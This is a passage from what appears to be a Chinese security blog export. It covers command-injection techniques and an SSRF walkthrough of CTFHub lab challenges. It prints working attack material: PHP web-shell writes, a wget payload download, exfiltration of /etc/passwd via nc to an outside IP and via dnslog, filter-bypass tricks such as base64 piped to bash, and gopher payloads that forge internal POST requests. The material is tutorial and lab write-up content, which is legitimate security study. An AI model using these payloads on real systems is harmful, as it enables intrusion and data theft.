title="windows"></a>windows</h4><table><thead><tr><th>符号</th><th></th><th>作用</th></tr></thead><tbody><tr><td>后台任务符号</td><td>&amp;</td><td>先执行前面的命令再执行后面的命令。</td></tr><tr><td>逻辑与</td><td>&amp;&amp;</td><td>前面的命令执行成功后，它后面的命令才被执行。</td></tr><tr><td>管道符</td><td>|</td><td>显示后面的执行结果。</td></tr><tr><td>逻辑或</td><td>||</td><td>只有 || 前面的命令执行失败后，它后面的命令才被执行。</td></tr></tbody></table><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><ul><li><code>sleep</code> 延时</li><li><code>http</code> 请求</li><li><code>dnslog</code></li></ul><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><h5 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h5><p><a href="http://www.bu8ug.com/index.php/other/shell-base64/">http://www.bu8ug.com/index.php/other/shell-base64/</a></p><h5 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h5><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> | echo &#x27;&lt;?php @eval($_POST<span class="hljs-string">[cmd]</span>);?&gt;&#x27; &gt;shell.php<br><span class="hljs-number">127.0.0.1</span> | echo <span class="hljs-string">&quot;PD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUWydjbWQnXSk/Pg==&quot;</span>|base64 -d &gt;shell.php<br><span class="hljs-number">127.0.0.1</span> | net user &gt; <span class="hljs-number">1</span>.txt<br><span class="hljs-number">127.0.0.1</span> | ipconfig &gt;&gt; <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><h5 id="外部下载"><a href="#外部下载" class="headerlink" title="外部下载"></a>外部下载</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//i</span>p/ping.txt &gt; shell.php<br>wget http:<span class="hljs-regexp">//i</span>p/ping.txt -O shell.php<br></code></pre></td></tr></table></figure><h5 id="外带数据"><a href="#外带数据" class="headerlink" title="外带数据"></a>外带数据</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">dnslog</span><br>127.0.0.1 | curl `whoami`.3og80l.dnslog.cn<br>127.0.0.1 | ping `whoami`.3og80l.dnslog.cn<br><span class="hljs-meta prompt_"># </span><span class="language-bash">nc 外带</span><br>nc -lvp 8000<br>127.0.0.1 | nc 43.140.192.244 8000 &lt; /etc/passwd<br></code></pre></td></tr></table></figure><h2 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h2><ul><li>过滤空格</li><li>黑名单过滤</li><li>文件名过滤</li></ul><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">IFS</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">IFS<span class="hljs-variable">$1</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;IFS&#125;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">IFS<span class="hljs-variable">$9</span></span><br>&lt;     比如cat&lt;a.tct:表示cat a.txt<br>&lt;&gt;<br>&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来<br><span class="hljs-meta prompt_">%</span><span class="language-bash">20</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">09</span><br></code></pre></td></tr></table></figure><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><h5 id="命令拼接"><a href="#命令拼接" class="headerlink" title="命令拼接"></a>命令拼接</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">a=who;b=ami;$a$b //命令拼接<br>//set命令(windows)<br>set a=who<br>set b=ami<br><span class="hljs-meta prompt_">%</span><span class="language-bash">a%%b% //正常执行<span class="hljs-built_in">whoami</span></span><br>call %a%%b% //正常执行whoami<br></code></pre></td></tr></table></figure><h5 id="反斜线绕过"><a href="#反斜线绕过" class="headerlink" title="反斜线绕过"></a>反斜线绕过</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wh\o\ami<br></code></pre></td></tr></table></figure><h5 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">who&quot;a&quot;mi<br>whoa&#x27;m&#x27;i<br>whoam``i<br></code></pre></td></tr></table></figure><h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo d2hvYW1p|base64 -d|sh  #base64绕过,其中d2hvYW1p是whoami的base64编码<br>echo d2hvYW1p|base64 -d|bash  #base64绕过,其中d2hvYW1p是whoami的base64编码<br> `echo d2hvYW1p|base64 -d` //将其base64解码,然后用反引号来执行命令<br>echo 77686F616D69 | xxd -r -p | bash //hex绕过,其中77686F616D69是whoami的hex编码<br></code></pre></td></tr></table></figure><h5 id="特殊字符绕过"><a href="#特殊字符绕过" class="headerlink" title="特殊字符绕过"></a>特殊字符绕过</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">//$</span><span class="language-bash">*和<span class="hljs-variable">$@</span>，<span class="hljs-variable">$x</span>(x 代表 1-9),<span class="hljs-variable">$&#123;x&#125;</span>(x&gt;=10)</span> <br>//比如ca$&#123;21&#125;t a.txt表示cat a.txt    在没有传入参数的情况下,这些特殊字符默认为空,如下:<br><span class="hljs-meta prompt_">wh$</span><span class="language-bash">1oami</span><br><span class="hljs-meta prompt_">who$</span><span class="language-bash">@ami</span><br><span class="hljs-meta prompt_">whoa$</span><span class="language-bash">*mi</span><br></code></pre></td></tr></table></figure><h5 id="字符夹命令"><a href="#字符夹命令" class="headerlink" title="字符夹命令"></a>字符夹命令</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">666`whoami`666//bash: 666root666: command not found<br>666`\whoami`666//bash: 666root666: command not found<br></code></pre></td></tr></table></figure><h5 id="命令夹字符"><a href="#命令夹字符" class="headerlink" title="命令夹字符"></a>命令夹字符</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">w`f1hgb`ho`f1hgb`am`f1hgb`i//反引号的作用是把括起来的字符当做命令执行<br>w`\f1hgb`ho`\f1hgb`am`\f1hgb`i//这个反斜线作用就是平时的那种连接,反引号的作用是把括起来的字符当做命令执行<br><span class="hljs-meta prompt_">wh$</span><span class="language-bash">(f1hgb)oa$(f1hgb)mi//和上面的差不多,都说执行和拼接8.同义函数</span><br></code></pre></td></tr></table></figure><h5 id="同义命令"><a href="#同义命令" class="headerlink" title="同义命令"></a>同义命令</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">more:一页一页的显示档案内容<br>less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容<br>grep：在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings<br></code></pre></td></tr></table></figure><h5 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h5><p><code>?</code>代表一个字符 <em>代表一串字符</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;<br>/???/?at flag<br>/???/?at ????<br></code></pre></td></tr></table></figure><h5 id="内敛执行绕过"><a href="#内敛执行绕过" class="headerlink" title="内敛执行绕过"></a>内敛执行绕过</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">`命令`和$(命令)都是执行命令的方式<br>echo &quot;xx`pwd`&quot;<br>echo &quot;xx$(pwd)&quot;<br></code></pre></td></tr></table></figure><h5 id="命令截断"><a href="#命令截断" class="headerlink" title="命令截断"></a>命令截断</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||<br>// %0a这些需要再get中写入，否则会被二次编码<br>windows中：%0a、&amp;、|、%1a、%26<br>set a=whoami<br><span class="hljs-meta prompt_">%</span><span class="language-bash">a:~0% //取出所有字符,所以正常执行命令</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">a:~0,6% //从开始切割6个字符,刚好是<span class="hljs-built_in">whoami</span>,所以正常执行</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">a:~0,5% //切割后是whoam,不是系统命令,不能执行</span><br><br>set a=abc qwe //先自定义<br>wh^o^%a:~0,1%mi //然后截断整理后就变成了:wh^o^ami,所以命令执行成功<br></code></pre></td></tr></table></figure><h3 id="绕过文件名"><a href="#绕过文件名" class="headerlink" title="绕过文件名"></a>绕过文件名</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat fl[abc]g.php //匹配[abc]中的任何一个<br>cat f[a-z]ag.txt //匹配a-z范围的任何字符<br>cat fla* //用*匹配任意<br>a=f;d=ag;c=l;cat $a$c$d.php 表示cat flag.php//内联执行<br><br>//正则<br>利用正则:比如要读取etc/passwd<br>cat /???/??????<br>cat /???/pass*<br>cat /etc$u/passwd<br></code></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>尽量不适应执行命令的函数，使用的话将参数写死</li><li>参数过滤，加转义符</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>WEB漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF 服务端请求伪造</title>
    <link href="/2023/05/28/WEB%E6%BC%8F%E6%B4%9E/SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <url>/2023/05/28/WEB%E6%BC%8F%E6%B4%9E/SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="SSRF-服务端请求伪造"><a href="#SSRF-服务端请求伪造" class="headerlink" title="SSRF 服务端请求伪造"></a>SSRF 服务端请求伪造</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>这个漏洞就是它名字所说的 “服务端请求伪造”，该漏洞的攻击方式就是借助服务端去请求其内网的其他服务器造成攻击。</p><p>漏洞原理：服务端实现了可以访问其他服务器资源的功能且没有对目标地址进行过滤控制，导致攻击者可以借助该功能去访问内网服务器。</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><ol><li>前端网、服务器所在内网、服务器本地进行端口查找，获取一些服务的 banner 信息等。</li><li>攻击运行重新访问或服务器本地的其他应用程序，如 dis、mysql 等。</li><li>对内网 Web 应用进行指纹识别，识别企业内部资产。</li><li>攻击外网的应用，主要是使用 HTTP GET&#x2F;POST 请求就可以实现的攻击，如 sql注入、文件上传等。</li><li>使用文件读取协议服务器本地文件等。</li><li>进行跳板攻击等。</li><li>DoS攻击（请求大文件，始终保持连接keep-alive always）</li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞入口点就是”目标地址”，实现该功能的函数支持哪些通讯协议就可以利用哪些协议进行攻击。</p><p>常用通讯协议如下：</p><ul><li><code>http/s://</code>：探测内网主机存活、端口开放情况</li><li><code>gopher://</code>：发送 GET 或 POST 请求；攻击内网应用，如 FastCGI、Redis</li><li><code>dict://</code>：泄露安装软件版本信息，查看端口，操作内网 redis 访问等</li><li><code>file://</code>：读取本地文件</li></ul><h2 id="靶场演示"><a href="#靶场演示" class="headerlink" title="靶场演示"></a>靶场演示</h2><p>靶场地址：<a href="https://www.ctfhub.com/">CTFHub </a>SSRF技能书</p><h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?url=http:/</span><span class="hljs-regexp">/127.0.0.1/</span>flag.php<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081738031.png" alt="image-20220515182728971"></p><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?url=file:/</span><span class="hljs-regexp">//</span>var<span class="hljs-regexp">/www/</span>html/flag.php<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081738041.png" alt="image-20220515183050259"></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-operator">/?</span>url<span class="hljs-operator">=</span><span class="hljs-built_in">dict</span><span class="hljs-operator">:</span><span class="hljs-comment">//127.0.0.1:8257</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081738051.png" alt="image-20220515183313569"><br><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081738678.png" alt="image-20220515183340839"><br><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081738689.png" alt="image-20220515184315714"><br><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081738798.png" alt="image-20220515184404441"><br><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081738938.png" alt="image-20220515184423098"></p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs qml">/?<span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//127.0.0.1:8257</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081738015.png" alt="image-20220515184553852"></p><h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><p><code>index.php</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>ndex.php<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>    &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-comment">//curl支持gopher协议,可通过此协议发送POST请求</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>flag.php</code></p><figure class="highlight plaintext"><figcaption><span>flag.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs |读取">?url=file:///var/www/html/flag.php<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>)<span class="hljs-comment">//获取IP地址,要求传输key值的IP地址是&quot;127.0.0.1&quot;才行</span><br>    &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just View From 127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-variable">$flag</span>=<span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;CTFHUB&quot;</span>);<br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key&quot;</span>] == <span class="hljs-variable">$key</span>) <br>    &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;form action=<span class="hljs-string">&quot;/flag.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<span class="hljs-comment">//POST传输数据</span><br>&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;key&quot;</span>&gt;<br>&lt;!-- Debug: key=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>;<span class="hljs-meta">?&gt;</span>--&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure><p>gopher 协议使用：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">gopher:<span class="hljs-regexp">//i</span>p:port/_payload<br>gopher:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span>/_payload<br></code></pre></td></tr></table></figure><p>构造数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:80<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>36<br><br><span class="language-abnf"><span class="hljs-attribute">key</span><span class="hljs-operator">=</span>a7415f5f6efbdeb9fc0ec74306b236d6</span><br></code></pre></td></tr></table></figure><p>拼接获取 Gopher 数据包：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">gopher:<span class="hljs-comment">//127.0.0.1:80/_POST /flag.php HTTP/1.1</span><br>Host: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span><br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: <span class="hljs-number">36</span><br><br>key=a7415f5f6efbdeb9fc0ec74306b236d6<br></code></pre></td></tr></table></figure><p>URL编码：<a href="https://www.bejson.com/enc/urlencode/">https://www.bejson.com/enc/urlencode/</a></p><p>这里在输入URL时解码了一次,又通过curl输出跳转，又解码了一次，所以需要对POST报文内容URL编码2次。</p><p>在第一次编码要把 <code>%0A</code> 全部改成 <code>%0D0A</code> ， <code>%0A</code> 是在 <code>linux</code>  系统中中代表换行符，在 <code>windos</code> 中是 <code>%0D0A</code> 代表换行符，但是网上的编码器大都是编码的 <code>%0A</code> ，所以我们需要改成 <code>windos</code> 能够识别的。</p><p>编码后：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250AContent-Length:%252036%250D%250A%250D%250Akey=a7415f5f6efbdeb9fc0ec74306b236d6<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081738162.png" alt="image-20220518232853020"></p><h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>)<span class="hljs-comment">//依旧要127.0.0.1</span><br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just View From 127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &gt; <span class="hljs-number">0</span>)<span class="hljs-comment">//上传文件大于0即可得到flag</span><br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;CTFHUB&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>Upload Webshell<br><br>&lt;form action=<span class="hljs-string">&quot;/flag.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span>&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure><p>依旧使用 gopher协议，构造数据包（这里改前端，加个提交按钮，获取数据包）。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081738990.png" alt="image-20220518235328809"><br><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081738095.png" alt="image-20220519000007098"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>challenge-f3618cb7fceb51b1.sandbox.ctfhub.com:10800<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------30615965732783302828302128172<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>375<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://challenge-f3618cb7fceb51b1.sandbox.ctfhub.com:10800<br><span class="hljs-attribute">Connection</span><span 